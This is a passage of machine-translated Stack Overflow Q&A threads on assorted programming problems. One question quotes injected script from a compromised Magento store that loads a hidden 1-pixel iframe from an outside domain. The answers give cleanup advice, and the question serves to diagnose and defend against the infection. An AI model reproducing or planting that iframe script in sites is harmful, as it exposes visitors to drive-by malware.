对于这种情况，是否有更标准的方式为 Maven 中的罐子命名？还是我走在正确的轨道上？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:23:43.193

从[http://maven.apache.org/pom.html](http://maven.apache.org/pom.html)：

> **分类器：** 分类器允许区分从相同 POM 构建但内容不同的工件。它是一些可选且任意的字符串——如果存在的话——被附加到工件名称之后，紧跟在版本号之后。
> 
> 作为这个元素的动机，例如，考虑一个项目，它提供了一个针对 JRE 1.5 的工件，但同时也提供了一个仍然支持 JRE 1.4 的工件。第一个工件可以配备分类器 jdk15，第二个工件配备 jdk14，以便客户端可以选择使用哪一个。

后一段表明他们希望分类器执行您想到的任务。

但是，根据我的经验，我遇到的大多数项目都会为项目的每个脉络发布单独的工件。我个人更喜欢这种方法，但这是一个品味问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T19:35:01.823

我认为使用具有不同分类器的相同组和工件 id 是最干净的方法。想想 Maven 源插件（它只是另一个分类器）是如何发布源 jar 的。看看这个：

[一个工件用于不同的配置](http://www.jayway.com/2010/01/21/one-artifact-with-multiple-configurations-in-maven/)

# azman - Microsoft.Interop.Security.AzRoles.AzAuthorizationStoreClass.Initialize 失败并出现 System.IO.FileLoadException

> ID：13822408
> 
> 赞同：3
> 
> 时间：2012-12-11T14:57:54.517
> 
> 标签：azman, fileloadexception

我们的 ASP.NET Web 应用程序使用授权管理器。在这个Web应用程序的一个页面上，授权存储是服务器上的一个本地XML文件，被多次访问以进行访问检查。我们的一些客户`System.IO.FileLoadException`在访问此页面时会得到一个。这是间歇性的。

堆栈跟踪：

> System.Web.HttpUnhandledException：引发了“System.Web.HttpUnhandledException”类型的异常。---> System.IO.FileLoadException：**该进程无法访问该文件，因为它正在被另一个进程使用。**（来自 HRESULT 的异常：0x80070020）在 Microsoft.Interop.Security.AzRoles.AzAuthorizationStoreClass.Initialize（Int32 lFlags，String bstrPolicyURL，Object varReserved）

进程监视器显示**共享违规**。我一直在寻找解决方案，但找不到。客户端位于 Windows Server 2003 SP2 上。所以这个修补程序[http://support.microsoft.com/kb/919754](http://support.microsoft.com/kb/919754)似乎并不适用，因为它是 Windows Server 2003 SP2 的一部分。

访问授权存储的代码如下：

```
private IAzApplication2 AzmanApplication
{
    get
    {
        AzAuthorizationStoreClass store = new AzAuthorizationStoreClass();
        store.Initialize(0, _connectionString, null);
        return store.OpenApplication2(_applicationName, null);
    }
} 
```

任何人都知道我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-24T01:23:56.880

这意味着该文件（可能是您为 AzMan 拥有的 XML 文件）在另一个应用程序中打开。确保 azman.mmc 没有运行并打开此商店以进行编辑/审查等。

# database - 不相交集的从句形式

> ID：13822410
> 
> 赞同：0
> 
> 时间：2012-12-11T14:57:58.443
> 
> 标签：database, set

如何以分句形式提及两个不相交的集合 A(x,y) 和 B(x,y)？我能够编写 FD 和其他约束的从句形式。但我无法做到这一点。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T21:20:18.023

不就是 {{A(x,y)},{B(x,y)}} 吗？

A 和 B 是谓词，x 和 ya 是常量（通常是小写字母）还是变量（通常是大写字母）？

# testing - 断言失败。无法确定为什么？

> ID：13822411
> 
> 赞同：0
> 
> 时间：2012-12-11T14:57:35.720
> 
> 标签：testing, automation, testng, assert

我有以下代码。

```
String rowNum = Integer.toString(rand.nextInt(max - min + 1) + min);
WebElement randomRow = driver.findElement(By.xpath("/html/body/div/div/div/div/form/div/div[2]/div/div[2]/div/div/div/div/div/div/div/table/tbody/tr["+rowNum+"]/td/div/input")); 
Assert.assertEquals(randomRow.getAttribute("checked").equals("checked"), "checked", "YES is not selected"); 
```

基本上 randomRow 是表格中的随机行，我正在检查其中有一个单选按钮的第一列。单选按钮应具有checked="checked" 的属性。

当测试达到断言时，它会失败并显示以下内容：

```
YES is not selected expected [checked[ but found ]false] 
```

关于为什么这个断言失败的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:08:13.233

您的断言失败，因为您正在比较两个对象的身份，一个布尔值和一个字符串。您应该比较布尔值或字符串。

这个

```
randomRow.getAttribute("checked").equals("checked") 
```

返回一个布尔值，您将它与字符串“checked”进行比较。你的断言应该是：

如果您想检查该行是否具有“已​​检查”属性，您可以像这样更简洁地编写您的断言：

```
Assert.assertEquals(randomRow.getAttribute("checked"), "checked", "YES is not selected"); 
```

# c# - 有效组合多个像素着色器

> ID：13822412
> 
> 赞同：14
> 
> 时间：2012-12-11T14:58:04.077
> 
> 标签：c#, xna, effect, pixel-shader, xna-3.0

所以我正在用 XNA 3.1 做一个东西，我有很多通过像素着色器应用的单独效果。这些来自各种来源，例如特殊攻击，环境等。我遇到的问题是我注意到帧速率显着降低。

目前，我正在将整个场景绘制到 RenderTarget2D，然后将所有效果应用到该 RenderTarget2D。我存储了一个包含效果及其 ID 的 SortedDictionary（ID 用于在运行时更改参数），并且我正在对其进行迭代并一个接一个地应用每个效果：

```
foreach(KeyValuePair<Ref<int>,Effect> p in renderEffects)
{
    Effect r = p.Value;
    g.SetRenderTarget(0, MainGame.MainRenderTarget);
    //Change RenderTarget to allow code to grab existing texture in the same draw area.
    levelDraw = MainGame.LevelRenderTarget.GetTexture();
    //Change back to draw back to this texture, allowing render effects to be layered.
    g.SetRenderTarget(0, MainGame.LevelRenderTarget);

    MainGame.StartDraw(MainGame.GameBatch);
    //Starts the sprite batch and sets some parameters
    r.Begin();
    r.CurrentTechnique.Passes[0].Begin();
    MainGame.GameBatch.Draw(levelDraw, new Rectangle(0, 0, levelDraw.Width, levelDraw.Height), Color.White);
    r.CurrentTechnique.Passes[0].End();
    r.End();
    MainGame.GameBatch.End();
} 
```

现在，当仅叠加 3 个效果时，这会产生明显的帧丢失，而当应用 10 个效果时，它会从 60FPS 下降到 16FPS，这当然是不可接受的。我想知道是否有更有效的方法来做到这一点。考虑到我只有一个纹理，我认为我可以将效果组合到一个文件中并执行多个通道，而无需重新抓取纹理。但是，我不确定这是否可能。

我不太确定最好的方法是什么，尽管我想一定有比我现在做的更好的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-30T08:40:39.133

片段中的方法可能非常慢，因为您正在为每个效果进行纹理抓取和全屏绘制，这会在着色器内部发生的任何事情之上强调 CPU 和 GPU 之间的内存带宽。正如您在帖子中建议的那样，您可能需要创建一组着色器，每个着色器都包含多个操作，而不是一遍又一遍地运行读写循环：一个昂贵的着色器通常仍然比许多读写重复更快简单的着色器。

您可能想查看[Shawn Hargreaves 关于 HLSL 中的着色器片段的文章](http://www.shawnhargreaves.com/hlsl_fragments/hlsl_fragments.html)以及[Tim Jones 在 XNA 中执行此操作的代码](http://timjones.tw/blog/archive/2010/11/13/introducing-stitchup-generating-shaders-from-hlsl-shader-fragments)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-22T03:03:22.537

绘制时是否对所有内容进行了完全着色？如果你的着色器计算量很大，你应该先做一个“深度通道”，只测试/写入 Z 缓冲区（颜色缓冲区写入关闭）。此外，使用非常简单的着色器来“深度填充”屏幕。

换句话说，渲染所有不透明对象仅在第一遍时更新深度缓冲区。

在第二次通过时，您打开着色器（并关闭深度写入，无需使用带宽来写回已经存在的相同值）。这将掩盖任何透支像素的所有不必要的工作，因为它们将立即通过深度测试。

编辑：现在我意识到 OP 正在做全屏效果，而不是场景渲染。

# php - 在头部回显 css 并在正文中包含 file.php 的函数

> ID：13822413
> 
> 赞同：0
> 
> 时间：2012-12-11T14:58:04.650
> 
> 标签：php, php-include

我正在尝试在我的 sitewide-variables.php 中创建一个函数，该函数将在页面头部回显一些额外的 css（不需要包含在每个页面中），同时包含 file.php（例如，如果页面为 1，则在页面的正文部分中使用头部所需的 css，显然，如果页面为 2，则根本不需要回显或包含任何内容。

类似于以下内容

```
<head><?php include("/variables/sitewide-variables.php"); ?>
<link href="css/style_new.css" rel="stylesheet" type="text/css">
<?php $number = 1; echo $css?>
</head>
<body>
<?php $number = 1; include $file.php?>
</body> 
```

我对此的理解是在 sitewide-variables.php 中创建类似于以下内容的内容

```
<?php 
$css[$number] = 'selected';
echo isset($css[1]) ? $css['some css code'] : '' 
?> 
```

这是我能做到的。

我知道以上所有可能只是一个巨大的错误，但我希望这足以解释我实际想要实现的目标。

您可能已经猜到了，我对 php 的了解非常有限。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:02:01.510

似乎有点多余，为什么不简单地有一个预设的 css 位数组：

```
$css = array(
   'style1' => '...',
   'style2' => '...',
   ...
); 
```

作为您的“css存储”，然后在页面的适当位置，您只需

```
echo $css['styleX']; 
```

无需设置更多全局变量来访问其他全局变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:32:33.440

如果我理解得很好，你有一个带有数字的变量，并且根据这个数字，你想在你的标题中添加一个 CSS。

您可以使用各种方法，例如 IF 或 SWITCH 函数。关于您想要处理它的方式，我会在“sitewide-variables.php”中添加一个函数，如下所示：

```
function mycss($number) {
    switch($number) {
        case 1 : $css = ' here goes css instructions for page 1 '; break;
        case 2 : $css = ' here goes css instructions for page 2 '; break;
        default : $css = ''; break; // no page, no css
    }
    return $css;
} 
```

这个函数将返回一个带有你的 CSS 的字符串，所以在你的页面中你可以添加这个：

```
<head><?php $number = 1; include("/variables/sitewide-variables.php"); ?>
<link href="css/style_new.css" rel="stylesheet" type="text/css">
<?php echo mycss($number); ?>
</head> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:31:36.397

这会解决你的问题吗？

```
<head>
<?php include("/variables/sitewide-variables.php"); ?>
<link href="css/style_new.css" rel="stylesheet" type="text/css">
<?php echo $css?>
</head>
<body>
<?php include ('file.php'); ?>
</body> 
```

然后在您的“sitewide-variables.php”文件中：

```
$css = "<style> ['insert css code here'] </style>"; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T18:49:59.353

我已将以下内容添加到 sitewide-variables.php

```
if ($number = 1)
    {$slider_css = '<style>
/* ~~ Slider ~~ */
.slider_panel {height:270px;margin-top:11px;clear:both;}
.slider {width:950px; height:250px; padding-top:10px;overflow:hidden;}
#fader {width:950px;height:250px;}
#fader ul {list-style:none;margin:0px;padding:0px;height:215px;width:950px;}
#fader ul li {width:950px;height:250px;display:none;}
#fader ul li.active {display:block;}
#faderNav {position:relative;float:right;margin-right:20px;width:150px;}
#faderNav a {background: none repeat scroll 0 0 #eee;border-radius: 3px 3px 3px 3px;-webkit-border-radius: 3px 3px 3px 3px;-moz-border-radius: 3px 3px 3px 3px;-o-border-radius: 3px 3px 3px 3px;display:block; float:left;height: 15px;margin: 10px 4px;width: 15px;outline:none;}
#faderNav a.active {background:#06222e;}
</style>';
$slider = $getPath . '/var/www/vhosts/mysite.com/httpdocs/trial/includes/top_slider.php';}
     else
     {$slider_css = ' ';
     $slider = ' ';} 
```

以及我网站上每个页面的以下内容

```
<head><?php $number = 1; include("/variables/sitewide-variables.php"); ?>
<link href="css/style_new.css" rel="stylesheet" type="text/css">
<?php echo $slider_css?>
</head>
<body>
<?php include $slider ?>
</body> 
```

这一切都开始以我需要的方式工作。

感谢所有试图帮助我的人！！！

# javascript - 客户magento网站包含恶意代码，如何摆脱它？

> ID：13822419
> 
> 赞同：1
> 
> 时间：2012-12-11T14:57:38.700
> 
> 标签：javascript, magento, malware

我的客户今天打电话给我，告诉我后端的某些功能突然停止工作。快速浏览后，我发现该网站在最后一个 html 标记下方包含恶意代码。这是代码：

```
<script type="text/javascript">     
    (function () {
        var zg = document.createElement('iframe');
        zg.src = 'http://impactrl.de/chat/esd.php';
        zg.style.position = 'absolute';
        zg.style.border = '0';    zg.style.height = '1px';
        zg.style.width = '1px';    zg.style.left = '1px';
        zg.style.top = '1px';
        if (!document.getElementById('zg')) {
            document.write('<div id=\'zg\'></div>');
            document.getElementById('zg').appendChild(zg);
        }})();
</script> 
```

我的客户还告诉我，他下载了一些软件，可以让他在桌面上运行他的商店。我敢打赌，这就是问题所在。

但是，我想摆脱那段代码，但我在任何文件中都找不到它。它在所有后端和前端页面上。

有谁知道我必须查看哪个文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T18:05:26.083

在客户的页面上有完全相同的问题，它被*JS/BlacoleRef.F.3*感染了。我也没有使用 Magento，所以我猜这个问题与它无关。所以我刚刚恢复了损坏的 HTML 文件，它现在显然可以工作了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:17:20.877

这是一个更大的问题。如果您在您的网站中发现了从未知服务器中提取资源的未知代码，**那么您就有了安全问题**。安全问题已经够糟糕的消息了，但在从事电子商务的网站上却是完全不可接受的情况。

此时唯一安全的做法是擦除服务器并从头开始安装。确保您使用的是最新且完全打补丁的操作系统、Apache、PHP 和 Magento 安装。

如果你有备份（我希望你有），一个好的开始可能是在出现任何问题之前进行备份。使您的服务器脱机，恢复备份，然后将所有组件更新到最新版本。只有这样才能安全地使服务器重新联机。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T16:39:16.397

这是一个很好的例子，说明为什么您经常并且总是备份您网站的代码库和数据库。实际上，如果您不知道代码来自哪里，您也不知道是否有多个插入点和其他东西弄乱了。更改所有登录和访问凭据（ssh、ftp、mysql、cPanel、用于维护的计算机（良好的站点破解从家里开始，扫描恶意软件），清除系统并重新安装。

将其搁置为 100% 事后诸葛亮，如果您正在寻找它的来源：

第一步是`grep`（`man grep`在您的 ssh 提示符下获取有关使用说明`grep`）您的代码库（基本上是任何文本文件，而不仅仅是 Magento 的，任何内容都可以从服务器上的任何位置包含）。您不仅要寻找在漏洞利用中发现的字符串，还要寻找插入混淆代码的迹象，因为大多数网站破解者希望代码的寿命更长一些。越不明显和容易找到越好。

第二步是`diff`针对新代码库，如果此站点接近库存，您可以在单独的文件夹中安装您正在运行的 Magento 版本的新解压缩，然后`diff`在实时安装和新安装之间的主目录上执行代码库来查找所有不同的文件。[Inchoo 有一篇关于使用 grep 查找代码差异的文章。](http://inchoo.net/ecommerce/magento/quickly-check-if-magento-core-files-are-modified/)使用的基本命令也适用于`diff -qrbB contaminated\code\location fresh\code\location`自`diff`定义模板的旧存储副本。

第三步是考虑它可能不在任何模板文件中。您正在查看一个受损登录，其中有人使用后端将代码放入用于代码包含的几个页面配置文本区域之一，添加了一个 CMS 块，然后引用它，通过驱动器将其放入系统- 通过代码插入，将某些内容插入到数据库中以包含来自另一个网站的 XSS 代码，或者如果您有外部暴露的 MySQL 端口，拥有数据库登录凭据并且可以随意插入任何内容。进行数据库转储并`grep`为字符串输入 SQL 代码又是另一种查找这些的工具。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T15:09:35.100

你一定要找到一种方法来防止它被插入到 DOM 中！在 Chrome 中，您在 Inspector 中有一个很好的资源概览。

为了安全起见，您可以检查页面中的其他 iframe，并添加一些 common.css `#zg{ display: none; }`。或者，

如果你有多个 iFrame，你可以使用 JS 并`document.getElementsByTagName("IFRAME")`循环使用它们，然后删除具有指定 src 值的那个。

更新：
Chrome 会验证这是否已添加到每个 JS 文件中。我解释为它是从服务器发送的。我不相信它与JS相关。

![在此处输入图像描述](../Images/a47864bf1e50d40da6c29eb7de372564.png)

# jboss7.x - JBoss AS 7 如何计算池中的空闲 bean

> ID：13822422
> 
> 赞同：1
> 
> 时间：2012-12-11T14:58:36.700
> 
> 标签：jboss7.x

我想知道是否有通过 CLI 可用的指标返回 EJB 池中可用的 SLSF 数量？谢谢最大

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-16T23:19:10.960

首先，您需要通过运行命令启用 ejb 的统计信息：

> /subsystem=ejb3:write-attribute(name=enable-statistics, value=true)

然后你可以去：

> /deployment=/subsystem=ejb3/stateless-session-bean=

您将能够看到此 SLSB 的所有统计信息

另请注意，如果您正在部署战争或耳朵，路径将类似于

> /deployment=/subdeployment=/subsystem=ejb3/...

# macos - 如何在 OS X 上离线安装 CouchDB 作为 LaunchDaemon

> ID：13822426
> 
> 赞同：1
> 
> 时间：2012-12-11T14:58:32.787
> 
> 标签：macos, couchdb, homebrew, nsbundle, launchd

如何将 CouchDB 应用程序包二进制文件作为 LaunchDaemon 运行？我可以以本地用户身份运行二进制文件，但是当我以 couchdb 用户身份运行捆绑的二进制文件时，我收到此错误：

```
sh-3.2$ /Applications/CouchDB\ Server.app/Contents/MacOS/CouchDB\ Server 
iniparser: cannot open /usr/local/var/lib/couchdb/Library/Preferences/couchdb-server.ini
Segmentation fault: 11 
```

好像我错过了一个步骤或存在权限问题。我认为 local.ini 文件需要修改，并且 couchdb-server.ini 是在运行时编写的，但我不确定。

我已经[从自制软件成功安装，](http://wiki.apache.org/couchdb/Installing_on_OSX)但这对我们来说不是一个好的解决方案，因为我们需要一个可以离线使用的打包安装程序。

一些调试数据：

```
sh-3.2$ cat /usr/local/var/lib/couchdb/Library/Preferences/couchdb-server.ini 

[couchdb]
database_dir = 
view_index_dir = 
uri_file = 

[query_servers]
javascript = bin/couchjs share/couchdb/server/main.js
coffeescript = bin/couchjs share/couchdb/server/main-coffee.js

[log]
file = 

[product]
title = 1.2.0 
```

和...

```
sh-3.2$ cat /Applications/CouchDB\ Server.app/Contents/Resources/couchdbx-core/etc/couchdb/local.ini 
; CouchDB Configuration Settings

; Custom settings should be made in this file. They will override settings
; in default.ini, but unlike changes made to default.ini, this file won't be
; overwritten on server upgrade.

[couchdb]
;max_document_size = 4294967296 ; bytes
database_dir = /usr/local/var/lib/couchdb

[httpd]
;port = 5984
;bind_address = 127.0.0.1
; Options for the MochiWeb HTTP server.
;server_options = [{backlog, 128}, {acceptor_pool_size, 16}]
; For more socket options, consult Erlang's module 'inet' man page.
;socket_options = [{recbuf, 262144}, {sndbuf, 262144}, {nodelay, true}]

; Uncomment next line to trigger basic-auth popup on unauthorized requests.
;WWW-Authenticate = Basic realm="administrator"

; Uncomment next line to set the configuration modification whitelist. Only
; whitelisted values may be changed via the /_config URLs. To allow the admin
; to change this value over HTTP, remember to include {httpd,config_whitelist}
; itself. Excluding it from the list would require editing this file to update
; the whitelist.
;config_whitelist = [{httpd,config_whitelist}, {log,level}, {etc,etc}]

[httpd_global_handlers]
;_google = {couch_httpd_proxy, handle_proxy_req, <<"http://www.google.com">>}

[couch_httpd_auth]
; If you set this to true, you should also uncomment the WWW-Authenticate line
; above. If you don't configure a WWW-Authenticate header, CouchDB will send
; Basic realm="server" in order to prevent you getting logged out.
; require_valid_user = false
secret = af156a45780111c8ce7581a05cbe4628

[log]
;level = debug

[os_daemons]
; For any commands listed here, CouchDB will attempt to ensure that
; the process remains alive while CouchDB runs as well as shut them
; down when CouchDB exits.
;foo = /path/to/command -with args

[daemons]
; enable SSL support by uncommenting the following line and supply the PEM's below.
; the default ssl port CouchDB listens on is 6984
; httpsd = {couch_httpd, start_link, [https]}

[ssl]
;cert_file = /full/path/to/server_cert.pem
;key_file = /full/path/to/server_key.pem
;password = somepassword
; set to true to validate peer certificates
verify_ssl_certificates = false
; Path to file containing PEM encoded CA certificates (trusted
; certificates used for verifying a peer certificate). May be omitted if
; you do not want to verify the peer.
;cacert_file = /full/path/to/cacertf
; The verification fun (optionnal) if not specidied, the default
; verification fun will be used.
;verify_fun = {Module, VerifyFun}
ssl_certificate_max_depth = 1
; To enable Virtual Hosts in CouchDB, add a vhost = path directive. All requests to
; the Virual Host will be redirected to the path. In the example below all requests
; to http://example.com/ are redirected to /database.
; If you run CouchDB on a specific port, include the port number in the vhost:
; example.com:5984 = /database

[vhosts]
;example.com = /database/

[update_notification]
;unique notifier name=/full/path/to/exe -with "cmd line arg"

; To create an admin account uncomment the '[admins]' section below and add a
; line in the format 'username = password'. When you next start CouchDB, it
; will change the password to a hash (so that your passwords don't linger
; around in plain-text files). You can add more admin accounts with more
; 'username = password' lines. Don't forget to restart CouchDB after
; changing this.
[admins]
;admin = mysecretpassword 
```

# database - 从数据库中提取数据但具有不同的数据库版本

> ID：13822428
> 
> 赞同：0
> 
> 时间：2012-12-11T14:58:54.080
> 
> 标签：database

我面临从数据库中提取数据的问题。问题是我有多个版本的数据库。每个版本的可用列数不同，并且列的名称（标签）也可能发生变化。

**例如：** 一个版本有名为 的列`contact`，但另一个版本是`contact_name`（它们代表相同的信息）。

问题是如何处理列名可以从一个数据库版本更改为另一个数据库版本的这种情况。此外，如果可能，如果已将更多信息（列）添加到数据库中，则减少更改我的源代码的需要。

在开始编码之前，我想听听一些建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:07:33.587

如果您无法更改数据库，请查看在代码和数据库之间实现抽象层：

> [数据库抽象层](http://en.wikipedia.org/wiki/Database_abstraction_layer)通过向开发人员提供一致的 API 来减少工作量，并尽可能地将数据库细节隐藏在该接口后面。

然后，您可以在不担心底层结构的情况下进行开发，并包含有关在该层内的什么数据库中使用哪些列的所有信息。

在实践中，您将使用什么取决于您使用的语言、您使用的数据库以及应用程序的设计方式。

# ruby-on-rails-3 - 在ajax中设计句柄注销重定向

> ID：13822431
> 
> 赞同：1
> 
> 时间：2012-12-11T14:58:59.503
> 
> 标签：ruby-on-rails-3, jquery, devise

我有一个带有 Rails/Devise 服务器的 Backbone.js 客户端。

我想用重定向实现注销过程。

这是我的客户端代码

```
$.ajax
  url: "/sign_out"
  xhrFields:
    'X-CSRF-Token': $('meta[name=csrf-token]').attr('content')
  type: "DELETE"
  complete: xCompleteFunction = (XMLHttpRequest, textStatus) ->
    #handle here? 
```

该请求由适当的控制器方法处理。然后我有

```
 def after_sign_out_path_for(resource)
    root_path
  end 
```

这是日志

```
[2012/12/11 15:44:07] (INFO) 76430 Started DELETE "/sign_out"
[2012/12/11 15:44:07] (INFO) 76430 Processing by Devise::SessionsController#destroy as */*
....
[2012/12/11 15:44:07] (INFO) 76430 Redirected to http://localhost:3000/ 
```

Hoverer，重定向由 Rails 控制器处理，实际上重定向使用了相同的动词“DELETE”。

```
[2012/12/11 15:44:13] (INFO) 76430 Started DELETE "/" 
[2012/12/11 15:44:13] (INFO) 76430 Processing by HomeController#index as */* 
```

是否可以处理客户端上的重定向，并防止 Rails 控制器捕获它？由于ajax调用，我期待设计将301/302返回给客户端。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2015-07-08T11:37:37.620

我实际上也遇到了同样的问题。可以覆盖`Devise::SessionsController`，这就是我解决它的方法。

在 中`Devise::SessionsController`，有一种[方法](https://github.com/plataformatec/devise/blob/868d3d82a014509167ccd7dd3e794171011bffe1/app/controllers/devise/sessions_controller.rb#L73) `#respond_to_on_destroy`可以实际进行重定向。通过覆盖它，它只有 200 个。

```
class SessionsController < Devise::SessionsController

  private

  # We sign out using Ajax calls so we override this method to render plain
  # text instead of redirecting unnecessarily
  def respond_to_on_destroy
    respond_to do |format|
      format.all { head :no_content }
      format.any(*navigational_formats) { render plain: "Signed out" }
    end
  end
end 
```

这有一个明显的问题，因为重写这样的私有方法并不是很好（使用它的实现可能会在我们没有意识到的情况下发生变化），但我找不到任何其他方法来很好地做到这一点。如果在这种情况下，Devise 允许您渲染而不是重定向，那就太好了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-12T21:02:56.740

我也在寻找这个问题的答案。在为注销用户而发送的第一个 DELETE 请求之后，我不确定如何处理第二个重定向设计。但是[在这里](http://rubythings.blogspot.com/2011/10/ajax-redirects-with-devise.html)我发现添加一个捕获 401（未经授权）响应的 ajax 初始化代码可以解决问题。

```
$.ajaxSetup({
  statusCode: {
    401: function(){
      // Redirect the to the login page.
      location.href = "/admin/auth/sign_in";
    }
  }
}); 
```

希望能帮助到你。干杯。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-22T11:24:16.597

发生这种情况是因为默认情况下，您的 Ajax 调用遵循 302（'Moved Temporarily'）不是作为错误状态，而是在位置标头存在时重试第二个请求。

要么更改状态并重定向到 js 代码成功回调中的位置标头，要么返回 nil 位置并在客户端处理重定向。

如果您想通过 json 和 html 来区分登录，那么只需在控制器代码中添加条件 self.request.format.symbol 即可。

# r - 在“boot”中计算 BCa 的 bootstrap 复制次数

> ID：13822434
> 
> 赞同：1
> 
> 时间：2012-12-11T14:58:41.477
> 
> 标签：r, statistics

我在 R 中使用“引导”包来计算 BCa 置信度。但是，我收到一条错误消息，例如“bca.ci 中的错误（boot.out, conf, index[1L], L= L, t = to, t0 = t0.o, :estimatedadjustment 'a' is NA）”。对于 N = 2000 的数据集，我可以找到具有 2000 次复制的 BCa，但是在使用 1000 或 1500 次复制时出现上述错误消息。有人知道错误消息的含义吗？它与引导复制的数量有关吗？非常感谢任何意见或建议！

# android - 将修改后的位图存储到磁盘

> ID：13822436
> 
> 赞同：0
> 
> 时间：2012-12-11T14:59:08.013
> 
> 标签：android

我正在处理的项目需要圆角（是的，不幸的是来自 iphone 的副本）。下载图像时，我会绕过角落，然后显示。这是我如何绕过角落...

```
public class ImageRounder {

    private Paint paint = new Paint();
    private Canvas canvas;
    private Rect rect;
    private RectF rectF;
    final int color = 0xff424242;

    @Inject
    public ImageRounder() {}

    public synchronized Bitmap getRoundedCornerBitmap(Bitmap bitmap, int pixels) {
        Bitmap output = Bitmap.createBitmap(bitmap.getWidth(), bitmap
                .getHeight(), Bitmap.Config.ARGB_8888);
        canvas = new Canvas(output);
        paint.reset();
        rect =  new Rect(0, 0, bitmap.getWidth(), bitmap.getHeight());
        rectF = new RectF(rect);
        float roundPx = pixels;

        paint.setAntiAlias(true);
        canvas.drawARGB(0, 0, 0, 0);
        paint.setColor(Color.BLACK);

        canvas.drawRoundRect(rectF, roundPx, roundPx, paint);

        paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));
        canvas.drawBitmap(bitmap, rect, rect, paint);

        return output;

    }
} 
```

我还将图像保存到磁盘，因此我不必多次下载。这就是我保存和检索图像的方式

```
@Override
public synchronized void saveImage(String id, Bitmap bitmap) throws FileNotFoundException       {
    FileOutputStream outputStream = context.openFileOutput(id, Context.MODE_PRIVATE);
    bitmap.compress(Bitmap.CompressFormat.JPEG, 100, outputStream);
}

@Override
public synchronized Bitmap getImage(String id) throws FileNotFoundException {
    return BitmapFactory.decodeStream(context.openFileInput(id));
} 
```

问题是当我从磁盘检索图像时，它看起来像这样......

![在此处输入图像描述](../Images/a58edd9a3b2d3fe6cf9661145d89dafb.png)

很难告诉我角落是圆的，但背景是黑色的。我尝试将图像视图的背景设置为白色和透明，但角落仍然显示为黑色。

有人知道这是为什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:40:41.107

在`saveImage`中，您将位图压缩为 JPEG。

为了透明度，您必须使用`Bitmap.CompressFormat.PNG`

# android - findViewById() 为 getChildAt() 找到的视图返回 null

> ID：13822438
> 
> 赞同：0
> 
> 时间：2012-12-11T14:59:17.807
> 
> 标签：android, android-layout, android-source, findviewbyid

我正在对 AOSP SystemUI 应用程序进行一些修改，并在尝试在任意设备上运行它时遇到了一个非常特殊的问题：`findViewById()`返回`null`，而在其子项中导航时发现它确实存在。

我正在使用这个AOSP[源代码](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.0.4_r2.1/com/android/systemui/recent/RecentsPanelView.java/)并通过. 它编译得很好，但是 SystemUI 在以下第 337 行的逻辑中崩溃并出现 IllegalArgumentException：`lunch full-eng``make`

```
mRecentsContainer = (ViewGroup) findViewById(R.id.recents_container);
[...]
if (mRecentsContainer instanceof RecentsHorizontalScrollView){
    [...]
} else if (mRecentsContainer instanceof RecentsVerticalScrollView){
    [...]
}
else {
    throw new IllegalArgumentException("missing Recents[Horizontal]ScrollView");
} 
```

一点调试表明，`mRecentsContainer`事实上`null`。

我认为可能是一个不包含该特定视图的布局被夸大了，所以为了检查，我使用`getChildCount()`and递归地浏览了所有视图的子视图`getChildAt()`。事实并非如此。`@id/recents_container`就在那儿，两层深：

```
> @id/recents_root (7f0e0070) [RecentsPanelView]: (2 children)
--> @id/recents_bg_protect (7f0e0071) [FrameLayout]: (2 children)
----> @id/recents_container (7f0e0072) [RecentsVerticalScrollView]: (1 children)
------> @id/recents_linear_layout (7f0e0073) [LinearLayout]: (0 children)
----> @id/recents_no_apps (7f0e0074) [FrameLayout]: (1 children)
------> [unnamed] (ffffffff) [TextView]
--> @id/recents_dismiss_button (7f0e0075) [View] 
```

安装应用程序时，Logcat 中会出现一个单一的提示`system_process`：

> 12-11 22:38:01.090: W/ResourceType(165): 在包 0 中获取 0x7f060000 (t=5 e=0) 的条目失败（错误 -75）

`R.java`在目录中检查`SystemUI_intermediates`发现它指向一个看似无关的`status_bar_recents_app_label_color`，它只是`res/values/color.xml`.

这可能是什么原因造成的？布局是否没有正确膨胀，因为我在没有编译的设备上运行它？我认为问题可能是 SystemUI 对内部 Android 资源的引用，这些资源可能无法正确映射到我设备上的资源。那可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T17:50:28.167

显然，一些生成的文件一直存在。

`make clean`通过解决它从头开始重建源。

或者，我发现删除以下中间目录可以加快构建速度，但不能 100% 确定这涵盖了所有目录：

```
rm -rf out/target/product/generic/obj/APPS/SystemUI_intermediates/
rm -rf out/target/common/R/com/android/systemui
rm -rf out/target/product/generic/obj/APPS/framework-res_intermediates/
rm -f /out/target/common/R/com/android/internal/R.java
rm -rf out/target/product/generic/obj/PACKAGING/
rm -f out/target/product/generic/system/app/SystemUI.apk 
```

# php - 为什么它不能撤销 $course 变量？

> ID：13822444
> 
> 赞同：2
> 
> 时间：2012-12-11T14:59:41.287
> 
> 标签：php, jquery, ajax

下面是一段 php/mysqli 代码，它在下拉菜单中显示课程列表：

```
 $courseactive = 1;

